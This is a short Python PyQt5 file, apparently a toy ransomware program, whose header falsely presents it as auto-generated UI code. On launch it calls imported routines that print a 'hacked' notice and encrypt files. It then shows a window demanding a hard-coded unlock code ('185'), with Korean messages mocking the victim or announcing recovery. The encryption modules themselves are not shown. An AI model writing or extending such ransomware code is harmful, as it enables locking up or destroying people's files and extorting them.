# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'main_window.ui'
#
# Created by: PyQt5 UI code generator 5.10.1
#
# WARNING! All changes made in this file will be lost!

from PyQt5.QtWidgets import *
from PyQt5 import uic
import sys,os
from encrypt import *
from decrypt import *

form_class = uic.loadUiType("main.ui")[0]

class MyWindow(QMainWindow, form_class):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.pushButton.clicked.connect(self.btn_clicked)
        #self.pushButton_2.clicked.connect(self.btn_clicked_2)
        mytext = self.plainTextEdit.toPlainText()
    """
        def btn_clicked_2(self):
            QMessageBox.about(self, "Encrypt", "Encrypt")
            print_hacked()
            encrypt_executeable()
    """

    def btn_clicked(self):
        mytext = self.plainTextEdit.toPlainText()
        if(mytext != '185'):
            QMessageBox.about(self, "Wrong", "틀렸어 다시해")
            return None
        QMessageBox.about(self, "Decrypt", "너는 천재다 너의 파일은 복구되었다")
        decrypt_executeable()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    print_hacked()
    encrypt_executeable()
    myWindow = MyWindow()
    myWindow.show()
    app.exec_()